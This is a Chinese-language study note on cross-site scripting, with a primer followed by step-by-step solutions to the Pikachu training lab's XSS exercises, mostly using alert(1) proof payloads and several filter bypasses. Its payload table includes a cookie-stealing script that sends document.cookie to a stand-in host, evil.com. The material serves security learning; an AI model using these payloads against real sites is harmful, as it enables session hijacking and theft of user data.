# 概论
## 核心定义

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是指攻击者通过在目标网站中注入恶意的 JavaScript 代码，当用户访问该页面时，这段恶意代码会在用户浏览器中执行，从而窃取用户敏感信息或执行非授权操作的一种攻击方式。

> 💡 **关键点：** XSS 的本质是 **"代码注入"**—— 将用户输入的恶意代码当作 HTML/JavaScript 代码执行，而非纯文本显示。

## 核心三要素

|要素|说明|
|---|---|
|**输入点**|攻击者能够提交恶意代码的地方（搜索框、评论区、URL参数等）|
|**输出点**|恶意代码被"反射"或"存储"后，最终在页面中渲染的位置|
|**执行环境**|受害者浏览器（恶意代码在用户浏览器中运行，而非服务器）|

## 为什么 XSS 危害巨大

![[deepseek_mermaid_20260618_a16a46.png]]

|危害|说明|
|---|---|
|**会话劫持**|窃取用户的 Cookie（含 SessionID），冒充用户登录|
|**窃取敏感信息**|读取页面内容、表单输入、本地存储数据|
|**钓鱼攻击**|伪造登录框，诱导用户输入账号密码|
|**内网探测**|利用受害者浏览器探测内网存活主机和开放端口|
|**XSS 蠕虫**|自动传播，感染更多用户（如 2005 年 Samy 蠕虫）|
|**键盘记录**|记录用户在页面上的每一次按键|

## 四、XSS 的核心原理

### 正常场景

html

<!-- 用户输入：你好 -->
<p>你好</p>           <!-- 作为文本显示 -->

### XSS 攻击场景

html

<!-- 用户输入：<script>alert('XSS')</script> -->
<p><script>alert('XSS')</script></p>   <!-- 作为代码执行！ -->

### 核心问题

服务端将用户输入直接拼接到 HTML 页面中，没有做任何过滤或编码，导致浏览器将恶意代码当作正常的 HTML/JavaScript 执行。

## 常见 XSS 攻击代码示例

| Payload                                                                          | 用途         |
| -------------------------------------------------------------------------------- | ---------- |
| `<script>alert('XSS')</script>`                                                  | 验证是否存在 XSS |
| `<script>location.href='http://evil.com/steal?cookie='+document.cookie</script>` | 窃取 Cookie  |
| `<img src=x onerror=alert(1)>`                                                   | 标签事件触发     |
| `<a href="javascript:alert(1)">`                                                 | 伪协议触发      |
| `"><script>alert(1)</script>`                                                    | 闭合标签注入     |

## XSS 三大类型

|类型|特点|危害程度|
|---|---|---|
|**反射型 XSS**|恶意代码在 URL 参数中，"反射"到页面执行，需要诱骗用户点击链接|中|
|**存储型 XSS**|恶意代码存储在服务器数据库，每次访问页面都会执行|**高**|
|**DOM 型 XSS**|纯前端漏洞，恶意代码在前端 JavaScript 中执行，不经过服务器|中-高|

> 📌 **危害程度排序：** 存储型 > DOM型 > 反射型（存储型可持续攻击任何访问该页面的用户）

## 判断是否存在 XSS 漏洞的核心标准

|标准|说明|
|---|---|
|**输入是否被编码/过滤**|特殊字符如 `<`, `>`, `"`, `'` 是否被转义|
|**输出位置是否安全**|输出在 HTML 标签内、属性内、还是 JavaScript 代码内|
|**是否使用安全函数**|是否使用 `htmlspecialchars()`、`innerText` 等安全方法|
|**是否有 CSP 策略**|Content-Security-Policy 是否限制了脚本执行|
# xss之get请求
![[Pasted image 20260618092741.png]]
	分析：不怎么了解篮球球星，随便输入，弹出who is yaoming,i don't care!，貌似没有很实用的信息，点击提示，输kobe，返回一张球星的照片
![[Pasted image 20260618092940.png]]
**构建payload

	尝试构建payload，发现前端有输入限制，可能做了一层低级的xss防护

```html
<script>alert(1)</script>
```
![[Pasted image 20260618093035.png]]

	我这个写错了，抱歉
	打开元素，或者按F12，找input输入函数，检查一下是否有长度限制，果然！！！maxlength的值为20，将其修改为更大的数字，在进行xss攻击
	
![[Pasted image 20260618093616.png]]

**得胜
![[Pasted image 20260618093958.png]]

# 基于xss的post请求
	先登录进去，用户名和密码前面爆破的时候已经拿到了
	或者点击提示，他把这两个字段信息都给你了

![[Pasted image 20260618094200.png]]


**构建payload

	构建最简单的攻击载荷
```html
<script>alert(1)</script>
```

	发现有漏洞，得胜

	也可以用更加贴近攻击者的视角获取cookie
	构建payload，发现弹出来cookie信息，现在已经拿到了对方账户的cookie信息了
```html
<script>alert(document.cookie)</script>
```

**得胜
![[Pasted image 20260618095523.png]]

# 存储型xss
	发现是一个留言板，可以尝试输入一些文本或者字符进行尝试
**注意：这个存储型的xss是要经过数据库的
![[Pasted image 20260618102429.png]]

**构建payload 
	
	先构建一个简单的payload进行测试，是否有过滤
```html
<script>alert(1)</script>
```

	没有任何过滤
**得胜
![[Pasted image 20260618102838.png]]

# DOM型xss

	dom型的xss。。。文章第一部分有描述，是纯前端的漏洞

![[Pasted image 20260618102933.png]]

**构建payload

	构建之前，先看一下元素，f12
	发现href里面写入了<script>alert(1)</script>...
	我们将这个里面的代码修改一下，就能xss了

![[Pasted image 20260618103650.png]]

	构建payload
```html
javascript:alert(1)
```
	提交之后，要点击what do you see，之后才会弹出xss之后的窗口

![[Pasted image 20260618103919.png]]

# DOM型xss-x
	跟上一题一致，可以同上操作

![[Pasted image 20260618104038.png]]
**构建payload

	构建同上的xss载荷，进行尝试
```html
javascript:alert(1)
```

	 点击下方的蓝色信息，弹出来另外一个字段信息，再次点击试试？

![[Pasted image 20260618104344.png]]

# xss之盲打
	可能是无法查看源代码之类的，先构建个payload试试

![[Pasted image 20260618104455.png]]

**构建payload

	简单payload
```html
<script>alert(1)</script>
```

两个窗口都输入，如果只输入一个的话，可能会有限制，过不去。
![[Pasted image 20260618105314.png]]

	分析：没什么反应，点击提示显示访问一个网页，打开看看
	只给了一半，把整个拼接起来
给的地址：/xssblind/admin_login.php
完整网站地址：http://pikachu:82/vul/xss/xssblind/admin_login.php

	去访问这个网站，发现弹了两次弹窗，代表这两个文本框都有漏洞

**得胜
![[Pasted image 20260618105628.png]]

# xss之过滤

	这个题目有过滤了，可以先尝试一下基础的payload，看看都过滤了哪些

![[Pasted image 20260618105936.png]]

**构建payload


```html
<script>alert(1)</script>
```

	发现过滤掉了>，尝试构建新的payload
```html
<a href="" onclick=alert("上当了！你的数据被我窃取了")>点我获取flag</a>
```

**得胜
![[Pasted image 20260618112810.png]]

# xss之htmlspecialchars

**注解：
这个htmlspecialchars方法是将HTML特殊字符转换为 HTML 实体，使其失去“代码”能力，变成纯文本。
	这个方法只会过滤5个字符：<，>，&，"，'，这些，但是他们默认过滤的是前面四个，后面的单引号是默认关闭状态，不进行配置是不调用这个单引号的过滤规则
![[Pasted image 20260618112853.png]]

**构建payload

	已经知道可以用单引号尝试过滤，构建payload
```html
javascript:alert(1)
```

**得胜
![[Pasted image 20260618114138.png]]

# xss之href输出

	是a标签里面的，用这个绕过即可

![[Pasted image 20260618114217.png]]


	分析前端代码，可以绕过
	
![[Pasted image 20260618114925.png]]

**构建payload

```java
javascript:alert(1)
```
**得胜
![[Pasted image 20260618114817.png]]

# xss之js输出
	查看源码，加了限制，前面有个</script>，这样会把输入的xss载荷给过滤掉

![[Pasted image 20260618115305.png]]

**构建payload

```html
</script><script>alert(1)</script>
```

**得胜
![[Pasted image 20260618115532.png]]
